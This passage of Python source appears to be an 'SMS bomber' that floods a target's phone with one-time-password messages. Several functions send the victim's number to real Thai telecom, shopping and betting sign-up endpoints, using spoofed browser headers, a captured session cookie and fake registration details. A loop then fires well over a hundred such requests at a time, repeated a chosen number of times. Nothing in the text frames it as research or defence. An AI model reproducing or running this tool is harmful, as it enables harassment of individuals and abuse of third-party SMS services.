    requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"})

def smsapi99(phone):
    requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
      "Accept": "application/json, text/plain, /",
      "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
      "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})

def smsapi100(phone):
    requests.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":phone})

def smsapi101(phone):
    requests.post("https://api.starzth.com/homeshopping/v2/register/request",headers=headers,json={"username":phone,"name_th":"jsjss","lastname_th":"nxnxnx","password":"as257400A","birthday":"1982-08-08","sex":"M","telephone":f"+66{target[1:]}"})


def smsapixx(phone, amount):
  for i in range(int(amount) + 1):
    threading.submit(smsapixx1, phone)
    threading.submit(smsapixx2, phone)
    threading.submit(smsapixx3, phone)
    threading.submit(smsapixx4, phone)
    threading.submit(smsapixx5, phone)
    threading.submit(smsapixx6, phone)
    threading.submit(smsapixx7, phone)
    threading.submit(smsapixx8, phone)
    threading.submit(smsapixx9, phone)
    threading.submit(smsapixx10, phone)
    threading.submit(smsapixx11, phone)
    threading.submit(smsapixx12, phone)
    threading.submit(smsapixx13, phone)
    threading.submit(smsapixx14, phone)
    threading.submit(smsapixx15, phone)
    threading.submit(smsapixx16, phone)
    threading.submit(smsapixx17, phone)
    threading.submit(smsapixx18, phone)
    threading.submit(smsapixx19, phone)
    threading.submit(smsapixx20, phone)
    threading.submit(smsapixxcall21, phone)
    threading.submit(smsapixx22, phone)
    threading.submit(smsapixx23, phone)
    threading.submit(smsapixx24, phone)
    threading.submit(smsapixx25, phone)
    threading.submit(smsapixx26, phone)
    threading.submit(smsapixx27, phone)
    threading.submit(smsapixx28, phone)
    threading.submit(smsapixx29, phone)
    threading.submit(smsapixx30, phone)
    threading.submit(smsapixx31, phone)
    threading.submit(smsapixx32, phone)
    threading.submit(smsapixx33, phone)
    threading.submit(apis, phone)
    threading.submit(api1, phone)
    threading.submit(apidis, phone)
    threading.submit(apitrue, phone)
    threading.submit(api2, phone)
    threading.submit(api3, phone)
    threading.submit(api4, phone)
    threading.submit(api5, phone)
    threading.submit(api6, phone)
    threading.submit(api7, phone)
    threading.submit(api8, phone)
    threading.submit(api9, phone)
    threading.submit(api10, phone)
    threading.submit(api11, phone)
    threading.submit(api12, phone)
    threading.submit(api13, phone)
    threading.submit(api14, phone)
    threading.submit(api100, phone)
    threading.submit(api15, phone)
    threading.submit(api16, phone)
    threading.submit(api17, phone)
    threading.submit(api18, phone)
    threading.submit(api19, phone)
    threading.submit(api20, phone)
    threading.submit(api21, phone)
    threading.submit(api22, phone)
    threading.submit(api23, phone)
    threading.submit(api24, phone)
    threading.submit(api25, phone)
    threading.submit(api26, phone)
    threading.submit(api27, phone)
    threading.submit(api28, phone)
    threading.submit(api29, phone)
    threading.submit(api30, phone)
    threading.submit(api31, phone)
    threading.submit(api32, phone)
    threading.submit(api33, phone)
    threading.submit(api34, phone)
    threading.submit(api35, phone)
    threading.submit(api36, phone)
    threading.submit(api37, phone)
    threading.submit(api38, phone)
    threading.submit(api39, phone)
    threading.submit(api40, phone)
    threading.submit(api41, phone)
    threading.submit(api42, phone)
    threading.submit(api43, phone)
    threading.submit(api44, phone)
    threading.submit(api45, phone)
    threading.submit(api46, phone)
    threading.submit(api47, phone)
    threading.submit(api48, phone)
    threading.submit(api49, phone)
    threading.submit(api50, phone)
    threading.submit(api51, phone)
    threading.submit(api52, phone)
    threading.submit(api53, phone)
    threading.submit(api54, phone)
    threading.submit(api55, phone)
    threading.submit(api56, phone)
    threading.submit(api57, phone)
    threading.submit(api58, phone)
    threading.submit(api59, phone)
    threading.submit(api60, phone)
    threading.submit(api61, phone)
    threading.submit(api62, phone)
    threading.submit(api63, phone)
    threading.submit(api64, phone)
    threading.submit(api65, phone)
    threading.submit(api66, phone)
    threading.submit(api67, phone)
    threading.submit(api68, phone)
    threading.submit(api69, phone)
    threading.submit(api70, phone)
    threading.submit(api71, phone)
    threading.submit(api72, phone)
    threading.submit(api73, phone)
    threading.submit(api74, phone)
    threading.submit(api75, phone)
    threading.submit(api76, phone)
    threading.submit(api77, phone)
    threading.submit(api78, phone)
    threading.submit(api79, phone)
    threading.submit(api80, phone)
    threading.submit(api81, phone)
    threading.submit(api82, phone)
    threading.submit(noc, phone)
    threading.submit(aisplay, phone)
    threading.submit(api83, phone)
    threading.submit(api84, phone)
    threading.submit(api85, phone)
    threading.submit(api86, phone)
    threading.submit(api87, phone)
    threading.submit(api88, phone)
    threading.submit(api89, phone)
    threading.submit(api90, phone)
    threading.submit(api91, phone)
    threading.submit(call1, phone)
    threading.submit(smsapi11, phone)
    threading.submit(smsapi12, phone)
    threading.submit(smsapi13, phone)
    threading.submit(smsapi14, phone)
    threading.submit(smsapi15, phone)
    threading.submit(smsapi16, phone)
    threading.submit(smsapi17, phone)
    threading.submit(smsapi18, phone)
    threading.submit(smsapi19, phone)
    threading.submit(smsapi20, phone)
    threading.submit(smsapi21, phone)
    threading.submit(smsapi22, phone)
    threading.submit(smsapi23, phone)
    threading.submit(smsapi24, phone)
    threading.submit(smsapi25, phone)
    threading.submit(smsapi26, phone)
    threading.submit(smsapi27, phone)
    threading.submit(smsapi28, phone)
    threading.submit(smsapi29, phone)
    threading.submit(smsapi30, phone)
    threading.submit(smsapi31, phone)
    threading.submit(smsapi32, phone)
    threading.submit(smsapi33, phone)
    threading.submit(smsapi34, phone)
    threading.submit(smsapi35, phone)
    threading.submit(smsapi36, phone)
    threading.submit(smsapi37, phone)
    threading.submit(smsapi38, phone)
    threading.submit(smsapi39, phone)
    threading.submit(smsapi40, phone)
    threading.submit(smsapi41, phone)
    threading.submit(smsapi42, phone)
    threading.submit(smsapi43, phone)
    threading.submit(smsapi44, phone)
    threading.submit(smsapi45, phone)
    threading.submit(smsapi46, phone)
    threading.submit(smsapi47, phone)
    threading.submit(smsapi48, phone)
    threading.submit(smsapi49, phone)
    threading.submit(smsapi50, phone)
    threading.submit(smsapi51, phone)
    threading.submit(smsapi52, phone)
    threading.submit(smsapi53, phone)
    threading.submit(smsapi54, phone)
    threading.submit(smsapi55, phone)
    threading.submit(smsapi56, phone)
    threading.submit(smsapi57, phone)
    threading.submit(smsapi58, phone)
    threading.submit(smsapi59, phone)
    threading.submit(smsapi60, phone)
    threading.submit(smsapi61, phone)
    threading.submit(smsapi62, phone)
    threading.submit(smsapi63, phone)
    threading.submit(smsapi64, phone)
    threading.submit(smsapi65, phone)
    threading.submit(smsapi66, phone)
    threading.submit(smsapi67, phone)
    threading.submit(smsapi68, phone)
    threading.submit(smsapi69, phone)
    threading.submit(smsapi70, phone)
    threading.submit(smsapi71, phone)
    threading.submit(smsapi72, phone)
    threading.submit(smsapi73, phone)
    threading.submit(smsapi74, phone)
    threading.submit(smsapi75, phone)
    threading.submit(smsapi76, phone)
    threading.submit(smsapi77, phone)
    threading.submit(smsapi78, phone)
    threading.submit(smsapi79, phone)
    threading.submit(smsapi80, phone)
    threading.submit(smsapi81, phone)
    threading.submit(smsapi83, phone)
    threading.submit(smsapi84, phone)
    threading.submit(smsapi85, phone)
    threading.submit(smsapi86, phone)
    threading.submit(smsapi87, phone)
    threading.submit(smsapi88, phone)
    threading.submit(smsapi89, phone)
    threading.submit(smsapi90, phone)
    threading.submit(smsapi91, phone)
    threading.submit(smsapi92, phone)
    threading.submit(smsapi93, phone)
    threading.submit(smsapi94, phone)
    threading.submit(smsapi95, phone)
    threading.submit(smsapi96, phone)
    threading.submit(smsapi97, phone)
    threading.submit(smsapi98, phone)
    threading.submit(smsapi99, phone)
    threading.submit(smsapi100, phone)
    threading.submit(smsapi101, phone)

PLANARIA()
